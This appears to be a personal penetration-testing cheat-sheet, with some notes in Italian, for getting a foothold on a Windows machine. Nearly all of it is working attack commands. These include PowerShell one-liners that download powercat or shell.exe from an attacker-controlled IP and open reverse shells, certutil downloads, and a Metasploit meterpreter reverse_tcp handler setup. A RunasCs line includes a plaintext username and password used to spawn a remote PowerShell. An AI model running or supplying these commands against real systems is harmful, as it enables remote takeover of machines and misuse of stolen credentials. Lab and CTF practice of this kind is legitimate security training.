locate powercat.ps1

powershell iex (New-Object Net.WebClient).DownloadString('http://{IP}:{PORT1}/powercat.ps1');Invoke-powercat -Reverse -IPAddress {IP} -Port {PORT2}


powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.8.246.240:9003/powercat.ps1');powercat -c 10.8.246.240 -p 9002 -e cmd"




best way is msfvenom

https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.246.240:9003/shell.exe','shell.exe'); Start-Process 'shell.exe'"







-----------
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.8.246.240:9003/powercat.ps1');powercat -c 10.8.246.240 -p 9001 -e cmd"

una volta dentro fare
da kali
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom

da dentro
certutil -urlcache -f http://10.8.246.240:9003/shell.exe shell.exe

msfconsole -q 
use multi/handler
set LHOST e LPORT
set payload windows/meterpreter/reverse_tcp
run


.\shell.exe





















scarica runascs
certutil -urlcache -f http://10.8.246.240:9003/RunasCs.exe RunasCs.exe

.\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r {IP}:{PORT}